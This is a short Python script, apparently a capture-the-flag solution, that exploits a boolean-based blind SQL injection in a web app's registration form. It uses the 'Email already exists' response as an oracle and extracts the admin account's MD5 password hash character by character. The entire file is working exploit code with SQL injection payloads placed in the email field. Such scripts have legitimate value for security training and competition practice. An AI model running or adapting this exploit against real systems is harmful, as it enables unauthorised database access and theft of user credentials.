# solve.py
import requests, re

BASE = "http://ctf.compfest.id:7302"
TARGET = "admin@ristek.com"
hexchars = "0123456789abcdef"
s = requests.Session()

def is_true(payload):
    r = s.post(f"{BASE}/auth/register",
               data={"email": payload, "password": "x"},
               allow_redirects=False)
    return "Email already exists" in r.text

# sanity check
print("Injectable?", is_true("'OR'1'='1"))

hash_hex = []
for i in range(1, 33):
    for c in hexchars:
        p = f"'OR(SUBSTRING((SELECT password FROM users WHERE email='{TARGET}') FROM {i} FOR 1)='{c}')AND'1'='1"
        if is_true(p):
            hash_hex.append(c)
            print(f"[+] {i}: {c}  -> {''.join(hash_hex)}")
            break
    else:
        raise RuntimeError(f"no match at pos {i}")

admin_md5 = ''.join(hash_hex)
print("[+] admin md5:", admin_md5)
